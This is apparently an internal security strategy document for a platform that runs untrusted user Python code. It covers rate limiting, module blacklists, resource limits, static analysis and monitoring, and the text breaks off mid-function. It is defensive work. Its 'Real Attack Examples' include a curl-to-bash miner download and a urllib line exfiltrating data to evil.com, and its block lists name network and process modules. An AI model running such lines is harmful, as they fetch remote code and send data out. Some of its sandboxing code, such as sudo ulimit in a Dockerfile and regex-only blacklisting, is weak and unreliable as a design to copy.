# Security Strategy

This document outlines the comprehensive security strategy for the Python Secrets platform, with special focus on code execution security since we allow users to run arbitrary Python code.

## Table of Contents

1. [Overview](#overview)
2. [Current State Analysis](#current-state-analysis)
3. [Rate Limiting (P0 Critical)](#rate-limiting-p0-critical)
4. [Module Blacklisting](#module-blacklisting)
5. [Resource Limits](#resource-limits)
6. [Code Validation](#code-validation)
7. [E2B Security Configuration](#e2b-security-configuration)
8. [Pyodide Restrictions](#pyodide-restrictions)
9. [Abuse Prevention](#abuse-prevention)
10. [Monitoring & Alerting](#monitoring--alerting)
11. [Implementation Roadmap](#implementation-roadmap)
12. [Testing Security](#testing-security)

---

## Overview

The Python Secrets platform allows users to execute arbitrary Python code in two environments:

1. **E2B (Server-Side)**: Isolated Docker containers on our servers
2. **Pyodide (Client-Side)**: WebAssembly Python runtime in user's browser

This capability creates significant security and cost risks that must be addressed through multiple layers of protection.

### Key Threats

- **Cost Attacks**: Unlimited E2B executions can exhaust our budget
- **Resource Exhaustion**: Infinite loops, memory bombs
- **Malicious Code**: Crypto mining, network attacks, data exfiltration
- **Abuse**: Automated systems using our free compute resources

### Defense in Depth

We implement security at 7 layers:

```
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Rate Limiting      (Prevent abuse)                │
├─────────────────────────────────────────────────────────────┤
│  Layer 2: Input Validation    (Block invalid input)         │
├─────────────────────────────────────────────────────────────┤
│  Layer 3: Static Analysis     (Detect dangerous patterns)   │
├─────────────────────────────────────────────────────────────┤
│  Layer 4: Module Blacklist    (Block dangerous imports)     │
├─────────────────────────────────────────────────────────────┤
│  Layer 5: Resource Limits     (Timeout, memory, CPU)        │
├─────────────────────────────────────────────────────────────┤
│  Layer 6: Sandbox Config      (E2B network, filesystem)     │
├─────────────────────────────────────────────────────────────┤
│  Layer 7: Monitoring          (Detect and respond)          │
└─────────────────────────────────────────────────────────────┘
```

---

## Current State Analysis

### E2B Implementation (`src/core/compiler/server/index.ts`)

**Current Code:**
```typescript
export const compileCode = async (code: string): Promise<ExecutionResult> => {
  const sbx = await Sandbox.create()  // ❌ No timeout, no limits
  try {
    const execution = await sbx.runCode(code)  // ❌ No validation
    return {
      stdout: execution.logs.stdout.join('\n'),
      stderr: execution.logs.stderr.join('\n'),
      error: execution.error?.value || undefined,
    }
  } catch (error) {
    return {
      stdout: '',
      stderr: '',
      error: error instanceof Error ? error.message : 'Unknown error',
    }
  } finally {
    await sbx.kill()
  }
}
```

**Critical Vulnerabilities:**

| Issue | Risk | Severity |
|-------|------|----------|
| No timeout | Infinite loops consume resources | 🔴 Critical |
| No memory limit | Memory exhaustion attacks | 🔴 Critical |
| No CPU limit | CPU mining | 🔴 Critical |
| No network restrictions | Data exfiltration, attacks | 🔴 Critical |
| No module restrictions | `os.system()`, `subprocess` | 🔴 Critical |
| No rate limiting | Unlimited E2B cost 💀 | 🔴 Critical |
| No input validation | Injection attacks | 🟡 High |
| No static analysis | Detectable dangerous patterns | 🟡 High |

**Real Attack Examples:**

```python
# Crypto mining (costs us money)
import subprocess
subprocess.run(["curl", "https://evil.com/miner.sh | bash"])

# Infinite loop (consumes E2B time)
while True: pass

# Memory bomb (crashes sandbox)
data = []
while True:
    data.append(b"x" * 1024 * 1024)  # 1MB per iteration

# Network exfiltration
import urllib.request
urllib.request.urlopen("https://evil.com/exfiltrate?data=" + sensitive_data)
```

### Pyodide Implementation (`src/core/compiler/client/worker.ts`)

**Current Security:**
- ✅ 30-second timeout implemented
- ✅ Web Worker isolation
- ✅ Zero server cost (client-side execution)

**Remaining Issues:**
- ❌ No module blacklist (all Pyodide modules available)
- ❌ No input validation
- ❌ Possible infinite loops (30s is long)
- ⚠️ Loaded from public CDN (CSP risk if misconfigured)

### Frontend Integration (`src/app/(frontend)/(protected)/playground/page.tsx`)

```typescript
const result = await compileCode(code, compiler)
```

**Issues:**
- ❌ Direct function import (bypasses API security)
- ❌ User can force `compiler: 'server'`
- ❌ No authentication check before execution
- ⚠️ Route is `(protected)` but compiler function is not a server action

---

## Rate Limiting (P0 Critical)

**Priority: 🔴 IMMEDIATE - Implement before launching or E2B costs will explode.**

### Strategy Overview

Rate limiting is our primary defense against cost exhaustion. We must limit executions per user/IP at multiple time windows.

### Limits by Tier

```typescript
const RATE_LIMITS = {
  anonymous: {
    hourly: 10,      // 10 executions per hour
    daily: 50,       // 50 executions per day
    burst: 3,        // Max 3 in rapid succession
  },
  free: {
    hourly: 30,      // 30 executions per hour
    daily: 200,      // 200 executions per day
    burst: 5,
  },
  paid: {
    hourly: 100,     // 100 executions per hour
    daily: 1000,     // 1000 executions per day
    burst: 10,
  },
} as const
```

### Implementation with Redis

```typescript
// src/lib/rate-limiter.ts
import { redis } from '@/lib/redis'
import { Result } from '@/types/result'

type RateLimitTier = keyof typeof RATE_LIMITS

interface RateLimitConfig {
  hourly: number
  daily: number
  burst: number
}

export async function checkRateLimit(
  userId: string | null,
  tier: RateLimitTier = 'free'
): Promise<Result<void, RateLimitError>> {
  const limits = RATE_LIMITS[tier]
  const key = userId ? `user:${userId}` : `ip:${getClientIP()}`

  // Check burst limit (10-second window)
  const burstKey = `${key}:burst`
  const burstCount = await redis.incr(burstKey)
  if (burstCount === 1) {
    await redis.expire(burstKey, 10)  // 10-second window
  }
  if (burstCount > limits.burst) {
    return err({
      _tag: 'RateLimitExceeded',
      limitType: 'burst',
      retryAfter: 10,
      message: 'Too many requests. Please wait a moment.',
    })
  }

  // Check hourly limit
  const hourlyKey = `${key}:hourly:${Date.now() / 3600000 | 0}`  // Current hour
  const hourlyCount = await redis.incr(hourlyKey)
  if (hourlyCount === 1) {
    await redis.expire(hourlyKey, 3600)  // 1 hour
  }
  if (hourlyCount > limits.hourly) {
    return err({
      _tag: 'RateLimitExceeded',
      limitType: 'hourly',
      retryAfter: 3600,
      message: `Hourly limit reached. Upgrade for more executions.`,
    })
  }

  // Check daily limit
  const dailyKey = `${key}:daily:${Date.now() / 86400000 | 0}`  // Current day
  const dailyCount = await redis.incr(dailyKey)
  if (dailyCount === 1) {
    await redis.expire(dailyKey, 86400)  // 24 hours
  }
  if (dailyCount > limits.daily) {
    return err({
      _tag: 'RateLimitExceeded',
      limitType: 'daily',
      retryAfter: 86400,
      message: `Daily limit reached. Come back tomorrow or upgrade.`,
    })
  }

  return ok(undefined)
}
```

### Tier Determination

```typescript
// src/lib/compiler-service.ts
import { auth } from '@/lib/auth'

export async function determineTier(): Promise<RateLimitTier> {
  const session = await auth.api.getSession({ headers: headers() })

  if (!session?.user) {
    return 'anonymous'
  }

  // Check if user has active subscription
  const subscription = await getSubscription(session.user.id)
  return subscription?.status === 'active' ? 'paid' : 'free'
}
```

### Rate Limit Responses

When a user hits a limit, return appropriate responses:

```typescript
import type { RateLimitError } from '@/types/errors'

function handleRateLimitError(error: RateLimitError): ExecutionResult {
  return {
    stdout: '',
    stderr: '',
    error: error.message,
    rateLimit: {
      exceeded: true,
      limitType: error.limitType,
      retryAfter: error.retryAfter,
      upgradeUrl: error.limitType === 'hourly' || error.limitType === 'daily'
        ? '/pricing'
        : undefined,
    },
  }
}
```

### Paid User Queue Strategy

For paid users, instead of hard-blocking:

```typescript
async function executeWithQueue(
  userId: string,
  code: string
): Promise<ExecutionResult> {
  // Check if we have capacity
  const currentExecutions = await redis.get('executions:active')

  if (currentExecutions >= MAX_CONCURRENT_EXECUTIONS) {
    // Queue the request for paid users
    await redis.lpush('queue:paid', JSON.stringify({ userId, code }))

    return {
      stdout: '',
      stderr: '',
      error: 'Your code is queued. Position in queue: X',
      queued: true,
    }
  }

  // Execute immediately
  return executeCode(code)
}
```

---

## Module Blacklisting

Many Python modules provide capabilities that must not be allowed in user code.

### Forbidden Modules

```typescript
// src/lib/module-blacklist.ts
const FORBIDDEN_MODULES = [
  // File system operations
  'os',
  'shutil',
  'pathlib',
  'tempfile',
  'glob',

  // Process execution
  'subprocess',
  'multiprocessing',
  'threading',

  // Network operations
  'socket',
  'urllib',
  'urllib2',
  'urllib3',
  'http',
  'httplib',
  'ftplib',
  'telnetlib',
  'requests',  // If available via pip
  'httpx',

  // System access
  'sys',
  'ctypes',
  'importlib',
  'platform',

  // Code execution
  'eval',
  'exec',
  'compile',

  // Low-level
  '__import__',
  'builtins',
] as const

const FORBIDDEN_ATTRIBUTES = [
  'open',
  'getattr',
  'setattr',
  'delattr',
  '__getattribute__',
  '__import__',
]
```

### Validation Implementation

```typescript
// src/lib/code-validator.ts
import { Result, ok, err } from '@/types/result'
import type { ValidationError } from '@/types/errors'

export function validateCode(code: string): Result<void, ValidationError> {
  // Check for forbidden imports
  const importPatterns = [
    /import\s+([\w.]+)/g,                    // import os
    /from\s+([\w.]+)\s+import/g,             // from os import path
  ]

  for (const pattern of importPatterns) {
    const matches = [...code.matchAll(pattern)]
    for (const match of matches) {
      const module = match[1].split('.')[0]  // Get top-level module

      if (FORBIDDEN_MODULES.includes(module as any)) {
        return err({
          _tag: 'ForbiddenModule',
          module,
          message: `Module "${module}" is not allowed for security reasons.`,
        })
      }
    }
  }

  // Check for dangerous built-in functions
  const dangerousPatterns = [
    /\beval\s*\(/,
    /\bexec\s*\(/,
    /\bcompile\s*\(/,
    /__import__\s*\(/,
    /getattr\s*\(\s*__builtins__/,
  ]

  for (const pattern of dangerousPatterns) {
    if (pattern.test(code)) {
      const functionName = pattern.source.replace(/\\\(/g, '').substring(2)
      return err({
        _tag: 'ForbiddenFunction',
        function: functionName,
        message: `Function "${functionName}" is not allowed.`,
      })
    }
  }

  // Check for attribute access bypass attempts
  if (/__builtins__/.test(code)) {
    return err({
      _tag: 'ForbiddenAccess',
      target: '__builtins__',
      message: 'Direct access to __builtins__ is not allowed.',
    })
  }

  return ok(undefined)
}
```

### E2B Implementation

For E2B, we can also prevent module loading at runtime:

```typescript
// Before executing code, modify Python's builtins
const preloadCode = `
import sys

# Remove dangerous modules from available modules
forbidden = ['os', 'subprocess', 'sys', 'shutil', 'socket', 'urllib']
for module in forbidden:
    if module in sys.modules:
        del sys.modules[module]

# Override __import__
_original_import = __builtins__.__import__

def safe_import(name, *args, **kwargs):
    if name in forbidden:
        raise ImportError(f"Module '{name}' is not allowed")
    return _original_import(name, *args, **kwargs)

__builtins__.__import__ = safe_import
`

await sbx.runCode(preloadCode)
```

---

## Resource Limits

### E2B Resource Configuration

```typescript
// src/core/compiler/server/execution.ts
import { Sandbox } from '@e2b/code-interpreter'
import { Result } from '@/types/result'

interface ExecutionLimits {
  timeoutMs: number
  memoryMB: number
  cpuCount: number
}

const DEFAULT_LIMITS: ExecutionLimits = {
  timeoutMs: 10_000,    // 10 seconds
  memoryMB: 256,        // 256 MB
  cpuCount: 1,          // 1 CPU core
}

export async function executeWithLimits(
  code: string,
  limits: ExecutionLimits = DEFAULT_LIMITS
): Promise<Result<ExecutionResult, ExecutionError>> {
  const sbx = await Sandbox.create({
    timeoutMs: limits.timeoutMs,
    memoryMB: limits.memoryMB,
    cpuCount: limits.cpuCount,
    // E2B-specific settings
    env: {
      E2B_DENY_NETWORK: 'true',  // Block network access
      E2B_TIMEOUT_MS: limits.timeoutMs.toString(),
    },
  })

  try {
    // Race between execution and timeout
    const execution = await Promise.race([
      sbx.runCode(code),
      timeout(limits.timeoutMs, {
        _tag: 'Timeout',
        message: `Execution exceeded ${limits.timeoutMs}ms limit`,
      }),
    ])

    return ok({
      stdout: execution.logs.stdout.join('\n'),
      stderr: execution.logs.stderr.join('\n'),
      error: execution.error?.value,
    })
  } catch (error) {
    return err({
      _tag: 'ExecutionFailed',
      message: error instanceof Error ? error.message : 'Unknown error',
    })
  } finally {
    await sbx.kill()
  }
}

// Timeout helper
function timeout<T>(ms: number, error: T): Promise<T> {
  return new Promise((_, reject) =>
    setTimeout(() => reject(error), ms)
  )
}
```

### Tier-Based Limits

```typescript
const TIER_LIMITS = {
  anonymous: {
    timeoutMs: 5_000,     // 5 seconds
    memoryMB: 128,        // 128 MB
  },
  free: {
    timeoutMs: 10_000,    // 10 seconds
    memoryMB: 256,        // 256 MB
  },
  paid: {
    timeoutMs: 30_000,    // 30 seconds
    memoryMB: 512,        // 512 MB
  },
} as const
```

### Memory Monitoring

```typescript
// Check memory usage during execution
const execution = await sbx.runCode(code, {
  onStdout: (data) => {
    // Monitor output size
    if (outputBuffer.length > MAX_OUTPUT_SIZE) {
      throw new Error('Output size limit exceeded')
    }
  },
  onStderr: (data) => {
    // Monitor error output
    if (errorBuffer.length > MAX_ERROR_SIZE) {
      throw new Error('Error output size limit exceeded')
    }
  },
})
```

---

## Code Validation

### Input Validation with Zod

```typescript
// src/api/compiler/schemas.ts
import { z } from 'zod'

export const ExecutionRequestSchema = z.object({
  code: z.string()
    .min(1, 'Code cannot be empty')
    .max(10_000, 'Code cannot exceed 10KB')
    .refine(
      (code) => !code.includes('__import__'),
      { message: 'Forbidden __import__ usage' }
    )
    .refine(
      (code) => !/eval\s*\(/.test(code),
      { message: 'eval() is not allowed' }
    )
    .refine(
      (code) => !/exec\s*\(/.test(code),
      { message: 'exec() is not allowed' }
    ),
  compiler: z.enum(['client', 'server']),
  files: z.array(z.object({
    path: z.string()
      .min(1)
      .max(255)
      .regex(/^\/[\w\-./]+\.py$/, 'Invalid Python file path'),
    content: z.string()
      .max(50_000, 'File size exceeds 50KB limit'),
  })).optional(),
  entryPoint: z.string()
    .default('main.py')
    .regex(/^[\w\-./]+\.py$/, 'Invalid entry point'),
})

export type ExecutionRequest = z.infer<typeof ExecutionRequestSchema>
```

### Static Analysis

```typescript
// src/lib/static-analyzer.ts
export interface AnalysisResult {
  safe: boolean
  reason?: string
  confidence: 'high' | 'medium' | 'low'
}

export function analyzeCode(code: string): AnalysisResult {
  // Detect dangerous patterns
  const patterns = [
    {
      pattern: /while\s+True\s*:/i,
      reason: 'Potential infinite loop (while True)',
      confidence: 'high' as const,
    },
    {
      pattern: /for\s+\w+\s+in\s+range\(\d{5,}\)/,
      reason: 'Large range iteration (potential performance issue)',
      confidence: 'medium' as const,
    },
    {
      pattern: /import\s+os.*\bsystem\b/,
      reason: 'os.system() detected (command execution)',
      confidence: 'high' as const,
    },
    {
      pattern: /subprocess\./,
      reason: 'subprocess module detected (process execution)',
      confidence: 'high' as const,
    },
    {
      pattern: /\[.*?\]\s*\*\s*\d{4,}/,
      reason: 'Potential memory bomb (large list multiplication)',
      confidence: 'medium' as const,
    },
    {
      pattern: /open\s*\(\s*['"][/|]/,
      reason: 'Potential path traversal attempt',
      confidence: 'high' as const,
    },
  ]

  for (const { pattern, reason, confidence } of patterns) {
    if (pattern.test(code)) {
      return {
        safe: false,
        reason,
        confidence,
      }
    }
  }

  return { safe: true }
}
```

### Output Size Limits

```typescript
const MAX_OUTPUT_SIZE = 100_000  // 100KB
const MAX_ERROR_SIZE = 10_000    // 10KB

function truncateOutput(output: string, maxSize: number): string {
  if (output.length <= maxSize) return output

  return output.substring(0, maxSize) +
    '\n\n... (output truncated, exceeded limit)'
}
```

---

## E2B Security Configuration

### Environment Variables

```bash
# .env.production
E2B_API_KEY=your_key_here
E2B_TIMEOUT_MS=10000
E2B_DENY_NETWORK=true
E2B_MEMORY_MB=256
E2B_CPU_COUNT=1
E2B_TEMPLATE=python-secrets-sandbox
```

### Custom E2B Template

Create a custom sandbox template with pre-configured security:

```dockerfile
# E2B Dockerfile template
FROM python:3.11-slim

# Create non-root user
RUN useradd -m -s /bin/bash pythonuser
USER pythonuser
WORKDIR /home/pythonuser

# Install only safe packages
RUN pip install --no-cache-dir \
    numpy \
    pandas \
    matplotlib \
    scipy \
    scikit-learn \
    pytest

# Set environment variables
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV PATH="/home/pythonuser/.local/bin:${PATH}"

# Disable network (via iptables in template)
RUN sudo iptables -A OUTPUT -j DROP

# Set resource limits in template
RUN sudo ulimit -v 262144  # 256MB virtual memory
RUN sudo ulimit -t 10      # 10s CPU time
RUN sudo ulimit -u 100     # 100 processes max

CMD ["python3"]
```

### Network Blocking

```typescript
const sbx = await Sandbox.create({
  // E2B-specific network blocking
  env: {
    // Block at container level
    E2B_DENY_NETWORK: 'true',
  },
})

// Additional: Install iptables rule in sandbox
await sbx.runCode(`
import subprocess
subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-j', 'DROP'])
`)
```

### Filesystem Restrictions

```typescript
// Restrict filesystem access
await sbx.runCode(`
import os
# Restrict to home directory
os.chdir('/home/user')
# Set restrictive umask
os.umask(0o077)
`)
```

---

## Pyodide Restrictions

### Module Restrictions

```typescript
// src/core/compiler/client/worker.ts

const PYODIDE_FORBIDDEN = [
  'pyodide.http',      // HTTP requests from browser
  'pyodide.ffi',        // Foreign Function Interface
]

// After loading Pyodide
await py.runPythonAsync(`
import sys
import pyodide

# Remove forbidden modules
for module in ${JSON.stringify(PYODIDE_FORBIDDEN)}:
    parts = module.split('.')
    try:
        exec(f"del {parts[0]}")
    except:
        pass

# Restrict builtins
import builtins
original_open = builtins.open
def safe_open(path, *args, **kwargs):
    # Only allow reading from virtual filesystem
    if 'w' in args or 'a' in args:
        raise IOError("Write operations not allowed")
    return original_open(path, *args, **kwargs)
builtins.open = safe_open

# Disable eval/exec
builtins.eval = None
builtins.exec = None

# Clear sys.path to prevent imports
sys.path = []
sys.path_hooks = []
`)
```

### Virtual Filesystem Cleanup

```typescript
// After each execution, clean up the filesystem
async function cleanupPyodide(py: any) {
  await py.runPythonAsync(`
import shutil
import os

# Remove any user-created files
for item in os.listdir('/'):
    if item not in ['lib', 'lib64', 'usr', 'bin', 'etc']:
        try:
            if os.path.isfile(item):
                os.remove(item)
            elif os.path.isdir(item):
                shutil.rmtree(item)
        except:
            pass
`)
}
```

---

## Abuse Prevention

### Session Tracking

```typescript
// Track executions per session
interface SessionStats {
  executions: number
  lastExecution: number
  totalExecutionTime: number
}

async function trackSession(sessionId: string): Promise<Result<void, SessionLimitError>> {
  const key = `session:${sessionId}`
  const stats = await redis.hgetall<SessionStats>(key)

  if (!stats) {
    // New session
    await redis.hmset(key, {
      executions: 1,
      lastExecution: Date.now(),
      totalExecutionTime: 0,
    })
    await redis.expire(key, 3600)  // 1 hour
    return ok(undefined)
  }

  // Check session limits
  if (stats.executions >= MAX_SESSION_EXECUTIONS) {
    return err({
      _tag: 'SessionLimitExceeded',
      limit: MAX_SESSION_EXECUTIONS,
      message: 'Session execution limit reached. Start a new session.',
    })
  }

  // Increment
  await redis.hincrby(key, 'executions', 1)
  await redis.hset(key, 'lastExecution', Date.now())

  return ok(undefined)
}
```

### Cost Tracking

```typescript
// Track E2B costs per user
const E2B_COST_PER_EXECUTION = 0.001  // $0.001 per execution (example)

interface CostStats {
  dailyCost: number
  monthlyCost: number
}

async function trackCost(userId: string, executionTime: number): Promise<Result<void, CostLimitError>> {
  const cost = (executionTime / 1000) * E2B_COST_PER_EXECUTION
  const today = new Date().toISOString().split('T')[0]
  const month = today.substring(0, 7)

  // Daily cost
  const dailyKey = `cost:${userId}:daily:${today}`
  const dailyCost = await redis.incrbyfloat(dailyKey, cost)
  await redis.expire(dailyKey, 86400)

  if (dailyCost > MAX_DAILY_COST) {
    return err({
      _tag: 'DailyCostLimitExceeded',
      currentCost: dailyCost,
      limit: MAX_DAILY_COST,
      message: 'Daily cost limit reached. Please try again tomorrow.',
    })
  }

  // Monthly cost
  const monthlyKey = `cost:${userId}:monthly:${month}`
  const monthlyCost = await redis.incrbyfloat(monthlyKey, cost)
  await redis.expire(monthlyKey, 2592000)  // 30 days

  return ok(undefined)
}
```

### Anomaly Detection

```typescript
// Detect unusual patterns
interface AnomalyConfig {
  maxExecutionsPerMinute: number
  maxAverageExecutionTime: number
  maxErrorRate: number
}

async function detectAnomalies(
  userId: string,
  config: AnomalyConfig
): Promise<Result<void, AnomalyDetectedError>> {
  const key = `activity:${userId}`

  // Get recent activity (last minute)
  const recentExecutions = await redis.lrange(
    `${key}:executions`,
    0,
    -1
  )

  // Check frequency
  if (recentExecutions.length > config.maxExecutionsPerMinute) {
    await redis.set(`suspicious:${userId}`, 'high_frequency', 3600)
    return err({
      _tag: 'AnomalyDetected',
      type: 'high_frequency',
      message: 'Unusual activity detected. Account temporarily restricted.',
    })
  }

  // Check error rate
  const errors = recentExecutions.filter((e) => JSON.parse(e).error).length
  const errorRate = errors / recentExecutions.length

  if (errorRate > config.maxErrorRate) {
    await redis.set(`suspicious:${userId}`, 'high_error_rate', 3600)
    return err({
      _tag: 'AnomalyDetected',
      type: 'high_error_rate',
      message: 'High error rate detected. Are you testing the system?',
    })
  }

  return ok(undefined)
}
```

### IP-Based Blocking

```typescript
// Block suspicious IPs
interface IPBlock {
  ip: string
  reason: string
  expiresAt: number
}

async function checkIPBlock(ip: string): Promise<boolean> {
  const block = await redis.get(`block:ip:${ip}`)

  if (block) {
    const data = JSON.parse(block)
    if (Date.now() < data.expiresAt) {
      return true  // IP is blocked
    }
    // Block expired, remove it
    await redis.del(`block:ip:${ip}`)
  }

  return false
}

async function blockIP(ip: string, reason: string, duration: number = 3600) {
  await redis.setex(
    `block:ip:${ip}`,
    duration,
    JSON.stringify({
      reason,
      blockedAt: Date.now(),
      expiresAt: Date.now() + duration * 1000,
    })
  )
}
```

---

## Monitoring & Alerting

### Metrics to Track

```typescript
// src/lib/monitoring.ts
interface ExecutionMetrics {
  userId: string | null
  compiler: 'client' | 'server'
  executionTime: number
  memoryUsed: number
  success: boolean
  errorType?: string
  timestamp: number
}

export async function trackExecution(metrics: ExecutionMetrics) {
  // Send to analytics (e.g., Mixpanel, PostHog)
  if (typeof window !== 'undefined') {
    // Client-side
    // @ts-ignore
    window.analytics?.track('code_execution', metrics)
  } else {
    // Server-side
    // Send to monitoring service
  }

  // Log structured event
  console.log(JSON.stringify({
    event: 'code_execution',
    ...metrics,
  }))
}
```

### Sentry Integration

```typescript
// src/lib/sentry.ts
import * as Sentry from '@sentry/nextjs'

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 1.0,

  // Custom security events
  beforeSend(event, hint) {
    // Detect security-related events
    if (event.tags?.security) {
      // Send to separate security project
      sendToSecurityMonitoring(event)
    }
    return event
  },
})

// Track security events
export function reportSecurityEvent(event: SecurityEvent) {
  Sentry.withScope((scope) => {
    scope.setTag('security', 'true')
    scope.setTag('security_type', event.type)
    scope.setExtra('details', event.details)
    Sentry.captureMessage(`Security Event: ${event.type}`)
  })
}
```

### Cost Alerts

```typescript
// Monitor E2B costs and alert
const COST_THRESHOLDS = {
  hourly: 10,    // $10/hour
  daily: 100,    // $100/day
  monthly: 1000, // $1000/month
}

async function checkCostThresholds() {
  const metrics = await getCostMetrics()

  if (metrics.hourly > COST_THRESHOLDS.hourly) {
    await sendAlert({
      severity: 'critical',
      message: `E2B cost exceeded hourly threshold: $${metrics.hourly}`,
      action: 'Consider throttling or disabling server execution',
    })
  }

  if (metrics.daily > COST_THRESHOLDS.daily) {
    await sendAlert({
      severity: 'warning',
      message: `E2B cost exceeded daily threshold: $${metrics.daily}`,
    })
  }
}

// Run every hour
setInterval(checkCostThresholds, 3600_000)
```

### Health Monitoring

```typescript
// Monitor E2B service health
export async function healthCheck(): Promise<HealthStatus> {
  try {
    const sbx = await Sandbox.create()
    const result = await sbx.runCode('print("test")')
    await sbx.kill()

    return {
      healthy: true,
      latency: result.executionTime,
    }
  } catch (error) {
    return {
      healthy: false,
      error: error instanceof Error ? error.message : 'Unknown error',
    }
  }
}

// Circuit breaker: disable E2B if unhealthy
let e2bEnabled = true

setInterval(async () => {
  const status = await healthCheck()

  if (!status.healthy) {
    e2bEnabled = false
    await sendAlert({
      severity: 'critical',
      message: 'E2B service unhealthy, temporarily disabled',
    })
  }
}, 60_000)  // Check every minute
```

---

## Implementation Roadmap

### P0 - Critical (Implement Immediately)

**Timeline: Week 1**

- [ ] **Rate Limiting**
  - [ ] Implement Redis-based rate limiting
  - [ ] Add tier-based limits (anonymous, free, paid)
  - [ ] Add burst protection
  - [ ] Test rate limit enforcement

- [ ] **E2B Resource Limits**
  - [ ] Add timeout (10s for free, 30s for paid)
  - [ ] Configure memory limits
  - [ ] Configure CPU limits
  - [ ] Enable network blocking

- [ ] **Basic Input Validation**
  - [ ] Add Zod schemas for code input
  - [ ] Add code size limits (10KB max)
  - [ ] Add file size limits for projects
  - [ ] Validate file paths

- [ ] **Cost Tracking**
  - [ ] Track executions per user
  - [ ] Calculate E2B costs per execution
  - [ ] Set up cost alerts
  - [ ] Implement automatic throttling at budget limits

### P1 - High Priority (Week 2)

- [ ] **Module Blacklisting**
  - [ ] Implement forbidden module list
  - [ ] Add import detection and blocking
  - [ ] Add dangerous function detection (eval, exec)
  - [ ] Test blacklisting with attack scenarios

- [ ] **Static Analysis**
  - [ ] Implement pattern detection
  - [ ] Add infinite loop detection
  - [ ] Add memory bomb detection
  - [ ] Add path traversal detection

- [ ] **Error Tracking**
  - [ ] Set up Sentry
  - [ ] Track security events
  - [ ] Track execution failures
  - [ ] Set up alerts for anomalies

- [ ] **Monitoring Dashboard**
  - [ ] Create metrics dashboard
  - [ ] Add cost visualization
  - [ ] Add execution statistics
  - [ ] Add user activity monitoring

### P2 - Medium Priority (Week 3-4)

- [ ] **Advanced Abuse Prevention**
  - [ ] Implement session tracking
  - [ ] Add anomaly detection
  - [ ] Implement IP blocking
  - [ ] Add CAPTCHA for suspicious activity

- [ ] **E2B Custom Template**
  - [ ] Create custom Docker image
  - [ ] Pre-install safe packages
  - [ ] Configure firewall rules
  - [ ] Set up resource limits in template

- [ ] **Pyodide Hardening**
  - [ ] Implement module restrictions
  - [ ] Add filesystem cleanup
  - [ ] Restrict built-in functions
  - [ ] Add output size limits

- [ ] **Security Testing**
  - [ ] Write attack simulation tests
  - [ ] Perform penetration testing
  - [ ] Test rate limit bypasses
  - [ ] Test resource exhaustion attacks

### P3 - Future Enhancements

- [ ] **ML-Based Anomaly Detection**
  - [ ] Train model on normal usage patterns
  - [ ] Implement real-time anomaly scoring
  - [ ] Auto-respond to threats

- [ ] **Advanced Cost Controls**
  - [ ] Predictive cost forecasting
  - [ ] Automatic budget optimization
  - [ ] Tier-based dynamic throttling

- [ ] **Compliance & Auditing**
  - [ ] Implement audit logging
  - [ ] Add compliance reporting
  - [ ] Implement data retention policies

---

## Testing Security

### Unit Tests

```typescript
// tests/unit/security/rate-limiter.test.ts
import { describe, it, expect } from 'vitest'
import { checkRateLimit } from '@/lib/rate-limiter'

describe('Rate Limiter', () => {
  it('blocks anonymous users after burst limit', async () => {
    const userId = null

    // Execute 3 times (burst limit)
    for (let i = 0; i < 3; i++) {
      const result = await checkRateLimit(userId, 'anonymous')
      expect(Result.isOk(result)).toBe(true)
    }

    // 4th should fail
    const result = await checkRateLimit(userId, 'anonymous')
    expect(Result.isErr(result)).toBe(true)
    if (Result.isErr(result)) {
      expect(result.error._tag).toBe('RateLimitExceeded')
      expect(result.error.limitType).toBe('burst')
    }
  })

  it('resets hourly limit after 1 hour', async () => {
    // Test time-based reset
  })
})
```

### Integration Tests

```typescript
// tests/integration/security/code-execution.test.ts
import { describe, it, expect } from 'vitest'
import { executeCode } from '@/api/compiler'

describe('Code Execution Security', () => {
  it('blocks forbidden modules', async () => {
    const result = await executeCode({
      code: 'import os\nos.system("ls")',
      compiler: 'server',
    })

    expect(Result.isErr(result)).toBe(true)
    if (Result.isErr(result)) {
      expect(result.error._tag).toBe('ForbiddenModule')
    }
  })

  it('blocks eval execution', async () => {
    const result = await executeCode({
      code: 'eval("print(1 + 1)")',
      compiler: 'server',
    })

    expect(Result.isErr(result)).toBe(true)
    if (Result.isErr(result)) {
      expect(result.error._tag).toBe('ForbiddenFunction')
    }
  })

  it('enforces timeout on infinite loops', async () => {
    const start = Date.now()
    const result = await executeCode({
      code: 'while True: pass',
      compiler: 'server',
    })
    const duration = Date.now() - start

    expect(Result.isErr(result)).toBe(true)
    expect(duration).toBeLessThan(15_000)  // Should timeout within 10s + overhead
  })
})
```

### Security Audit Checklist

- [ ] Test all forbidden modules are blocked
- [ ] Test rate limiting cannot be bypassed
- [ ] Test resource limits are enforced
- [ ] Test timeout kills execution
- [ ] Test network blocking prevents external requests
- [ ] Test memory limits prevent exhaustion
- [ ] Test file size limits are enforced
- [ ] Test malicious patterns are detected
- [ ] Test cost tracking is accurate
- [ ] Test alerts fire when thresholds exceeded

---

## Migration Guide

### Step 1: Create Security Infrastructure

```bash
# Create new security modules
mkdir -p src/lib/security
touch src/lib/security/rate-limiter.ts
touch src/lib/security/code-validator.ts
touch src/lib/security/static-analyzer.ts
touch src/lib/security/monitoring.ts
```

### Step 2: Wrap Existing Compiler Functions

```typescript
// src/core/compiler/server/index.ts
import { checkRateLimit } from '@/lib/security/rate-limiter'
import { validateCode } from '@/lib/security/code-validator'
import { analyzeCode } from '@/lib/security/static-analyzer'

export const compileCode = async (
  code: string,
  userId?: string
): Promise<Result<ExecutionResult, ExecutionError>> => {
  // 1. Rate limit
  const rateLimitResult = await checkRateLimit(userId || null, 'free')
  if (Result.isErr(rateLimitResult)) {
    return err(rateLimitResult.error)
  }

  // 2. Validate code
  const validationResult = validateCode(code)
  if (Result.isErr(validationResult)) {
    return err(validationResult.error)
  }

  // 3. Static analysis
  const analysis = analyzeCode(code)
  if (!analysis.safe && analysis.confidence === 'high') {
    return err({
      _tag: 'DangerousCode',
      reason: analysis.reason,
    })
  }

  // 4. Execute with limits
  return executeWithLimits(code)
}
```

### Step 3: Update API to Use Secure Compiler

```typescript
// src/api/compiler/index.ts
'use server'

import { auth } from '@/lib/auth'
import { compileCode } from '@/core/compiler/server'

export async function executeCode(input: ExecutionRequest) {
  const session = await auth.api.getSession({ headers: headers() })
  const userId = session?.user?.id

